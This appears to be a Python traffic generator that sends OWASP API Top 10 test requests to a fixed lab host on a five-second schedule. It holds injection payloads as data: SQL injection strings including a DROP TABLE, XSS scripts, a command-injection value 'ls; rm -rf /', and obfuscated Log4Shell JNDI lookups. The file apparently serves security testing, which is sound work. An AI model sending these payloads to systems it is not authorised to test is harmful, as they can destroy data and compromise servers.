import requests
import schedule
import time
from datetime import datetime
import random
import logging
import json
import uuid
import jwt
from urllib.parse import quote

# 設定日誌
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('traffic.log'),
        logging.StreamHandler()
    ]
)

# API 端點列表
ENDPOINTS = [
    "/",
    "/api1/user/1",
    "/api2/login",
    "/api2/profile",
    "/api3/data",
    "/api4/slow",
    "/api5/admin",
    "/api6/profile",
    "/api7/debug",
    "/api8/sqli",
    "/api8/xss",
    "/api9/old-api",
    "/api10/no-log",
    "/log4j/test"
]

# OWASP API Security Top 10 測試案例
API_SECURITY_TESTS = {
    "api1_broken_object": {
        "description": "Broken Object Level Authorization",
        "tests": [
            # 水平權限測試
            {"method": "GET", "path": "/api1/user/2", "expected": "嘗試訪問其他用戶資料"},
            {"method": "GET", "path": "/api1/user/3", "expected": "嘗試訪問其他用戶資料"},
            # IDOR 測試
            {"method": "GET", "path": "/api1/user/999", "expected": "嘗試訪問不存在的用戶"},
            # 垂直權限測試
            {"method": "GET", "path": "/api1/admin/users", "expected": "嘗試訪問管理員功能"}
        ]
    },
    "api2_broken_auth": {
        "description": "Broken User Authentication",
        "tests": [
            # 弱密碼測試
            {"method": "POST", "path": "/api2/login", "data": {"username": "admin", "password": "123456"}, "expected": "弱密碼測試"},
            {"method": "POST", "path": "/api2/login", "data": {"username": "admin", "password": "password"}, "expected": "常見密碼測試"},
            # Token 操縱測試
            {"method": "GET", "path": "/api2/profile", "headers": {"Authorization": "Bearer expired.token.here"}, "expected": "過期 Token 測試"},
            {"method": "GET", "path": "/api2/profile", "headers": {"Authorization": "Bearer invalid.token.here"}, "expected": "無效 Token 測試"},
            # 未驗證存取
            {"method": "GET", "path": "/api2/profile", "expected": "未驗證存取個人資料"}
        ]
    },
    "api3_excessive_data": {
        "description": "Excessive Data Exposure",
        "tests": [
            # 敏感資料暴露測試
            {"method": "GET", "path": "/api3/data", "expected": "檢查是否回傳過多敏感資料"},
            {"method": "GET", "path": "/api3/debug", "expected": "檢查是否回傳除錯資訊"},
            {"method": "GET", "path": "/api3/users", "expected": "檢查是否回傳完整用戶資料"}
        ]
    },
    "api4_rate_limiting": {
        "description": "Lack of Resources & Rate Limiting",
        "tests": [
            # 速率限制測試
            {"method": "GET", "path": "/api4/slow", "expected": "測試速率限制"},
            # 大量請求測試
            {"method": "POST", "path": "/api4/batch", "json": {"items": ["item" + str(i) for i in range(1000)]}, "expected": "大量請求測試"},
            # 長時間請求測試
            {"method": "GET", "path": "/api4/long", "expected": "長時間請求測試"}
        ]
    },
    "api5_broken_function": {
        "description": "Broken Function Level Authorization",
        "tests": [
            # 未授權功能訪問
            {"method": "GET", "path": "/api5/admin", "expected": "嘗試訪問管理功能"},
            {"method": "POST", "path": "/api5/users", "expected": "嘗試創建用戶"},
            {"method": "DELETE", "path": "/api5/users/1", "expected": "嘗試刪除用戶"}
        ]
    },
    "api6_mass_assignment": {
        "description": "Mass Assignment",
        "tests": [
            # 批量賦值測試
            {"method": "POST", "path": "/api6/profile", "json": {"name": "test", "email": "test@example.com", "role": "admin"}, "expected": "嘗試修改角色"},
            {"method": "PUT", "path": "/api6/user/1", "json": {"is_admin": True, "is_active": True}, "expected": "嘗試修改權限"},
            {"method": "PATCH", "path": "/api6/settings", "json": {"debug": True, "maintenance": True}, "expected": "嘗試修改系統設定"}
        ]
    },
    "api7_security_misconfig": {
        "description": "Security Misconfiguration",
        "tests": [
            # 錯誤訊息測試
            {"method": "GET", "path": "/api7/debug", "expected": "檢查是否洩露敏感資訊"},
            {"method": "GET", "path": "/api7/error", "expected": "檢查錯誤訊息"},
            # 設定測試
            {"method": "GET", "path": "/api7/config", "expected": "檢查是否洩露設定資訊"},
            {"method": "GET", "path": "/api7/version", "expected": "檢查是否洩露版本資訊"}
        ]
    },
    "api8_injection": {
        "description": "Injection",
        "tests": [
            # SQL 注入測試
            {"method": "GET", "path": "/api8/sqli", "params": {"q": "' OR '1'='1"}, "expected": "SQL 注入測試 1"},
            {"method": "GET", "path": "/api8/sqli", "params": {"q": "'; DROP TABLE users; --"}, "expected": "SQL 注入測試 2"},
            {"method": "GET", "path": "/api8/sqli", "params": {"q": "UNION SELECT * FROM users"}, "expected": "SQL 注入測試 3"},
            # XSS 測試
            {"method": "GET", "path": "/api8/xss", "params": {"input": "<script>alert('xss')</script>"}, "expected": "XSS 測試 1"},
            {"method": "GET", "path": "/api8/xss", "params": {"input": "<img src=x onerror=alert('xss')>"}, "expected": "XSS 測試 2"},
            # 命令注入測試
            {"method": "POST", "path": "/api8/exec", "json": {"cmd": "ls; rm -rf /"}, "expected": "命令注入測試"}
        ]
    },
    "api9_improper_assets": {
        "description": "Improper Assets Management",
        "tests": [
            # 舊版 API 測試
            {"method": "GET", "path": "/api9/old-api", "expected": "檢查舊版 API 是否仍可訪問"},
            {"method": "GET", "path": "/v1/users", "expected": "檢查舊版路徑"},
            {"method": "GET", "path": "/api9/deprecated", "expected": "檢查已棄用 API"},
            # 未使用 API 測試
            {"method": "GET", "path": "/api9/unused", "expected": "檢查未使用 API"}
        ]
    },
    "api10_insufficient_logging": {
        "description": "Insufficient Logging & Monitoring",
        "tests": [
            # 敏感操作日誌測試
            {"method": "POST", "path": "/api10/login", "json": {"username": "admin", "password": "test123"}, "expected": "檢查登入日誌"},
            {"method": "PUT", "path": "/api10/password", "json": {"new_password": "newpass123"}, "expected": "檢查密碼修改日誌"},
            {"method": "DELETE", "path": "/api10/user/1", "expected": "檢查刪除用戶日誌"},
            # 未記錄操作測試
            {"method": "GET", "path": "/api10/no-log", "expected": "檢查是否缺少日誌記錄"}
        ]
    },
    "log4j": {
        "description": "Log4j (Log4Shell)",
        "tests": [
            # Log4j 測試
            {"method": "GET", "path": "/log4j/test", "params": {"input": "${jndi:ldap://example.com/a}"}, "expected": "Log4j 測試 1"},
            {"method": "GET", "path": "/log4j/test", "params": {"input": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://example.com/a}"}, "expected": "Log4j 測試 2"},
            {"method": "GET", "path": "/log4j/test", "params": {"input": "${${::-j}ndi:rmi://example.com/a}"}, "expected": "Log4j 測試 3"}
        ]
    }
}

def generate_traffic():
    base_url = "http://apitest.ryantseng.work"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # 隨機選擇一個 API 弱點類別進行測試
    test_category = random.choice(list(API_SECURITY_TESTS.keys()))
    tests = API_SECURITY_TESTS[test_category]["tests"]
    
    logging.info(f"Testing {API_SECURITY_TESTS[test_category]['description']}")
    
    for test in tests:
        try:
            # 準備請求
            url = f"{base_url}{test['path']}"
            headers = test.get('headers', {})
            params = test.get('params', {})
            data = test.get('data', None)
            json_data = test.get('json', None)
            
            # 發送請求
            if test['method'] == 'GET':
                response = requests.get(url, headers=headers, params=params)
            elif test['method'] == 'POST':
                response = requests.post(url, headers=headers, params=params, data=data, json=json_data)
            elif test['method'] == 'PUT':
                response = requests.put(url, headers=headers, params=params, data=data, json=json_data)
            elif test['method'] == 'DELETE':
                response = requests.delete(url, headers=headers, params=params)
            elif test['method'] == 'PATCH':
                response = requests.patch(url, headers=headers, params=params, data=data, json=json_data)
            
            # 記錄結果
            logging.info(f"Test: {test['expected']} - Status: {response.status_code}")
            if response.status_code != 200:
                logging.warning(f"Response: {response.text}")
            
            # 隨機延遲 1-3 秒
            time.sleep(random.uniform(1, 3))
            
        except Exception as e:
            logging.error(f"Error in test {test['expected']}: {str(e)}")

def run_random_tests(num_tests=2):
    """隨機選取指定數量的測試案例執行"""
    base_url = "http://apitest.ryantseng.work"
    all_tests = []
    for category in API_SECURITY_TESTS.values():
        all_tests.extend(category["tests"])
    selected_tests = random.sample(all_tests, num_tests)
    logging.info("Randomly selected tests:")
    for test in selected_tests:
        try:
            url = f"{base_url}{test['path']}"
            headers = test.get('headers', {})
            params = test.get('params', {})
            data = test.get('data', None)
            json_data = test.get('json', None)
            if test['method'] == 'GET':
                response = requests.get(url, headers=headers, params=params)
            elif test['method'] == 'POST':
                response = requests.post(url, headers=headers, params=params, data=data, json=json_data)
            elif test['method'] == 'PUT':
                response = requests.put(url, headers=headers, params=params, data=data, json=json_data)
            elif test['method'] == 'DELETE':
                response = requests.delete(url, headers=headers, params=params)
            elif test['method'] == 'PATCH':
                response = requests.patch(url, headers=headers, params=params, data=data, json=json_data)
            logging.info(f"Test: {test['expected']} - Status: {response.status_code}")
            if response.status_code != 200:
                logging.warning(f"Response: {response.text}")
            time.sleep(random.uniform(1, 2))
        except Exception as e:
            logging.error(f"Error in test {test['expected']}: {str(e)}")

def main():
    logging.info("Starting OWASP API Security Top 10 test traffic generator...")
    
    # 立即執行一次
    generate_traffic()
    
    # 設定每5秒執行一次
    schedule.every(5).seconds.do(run_random_tests, num_tests=2)
    
    # 持續執行
    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == "__main__":
    main() 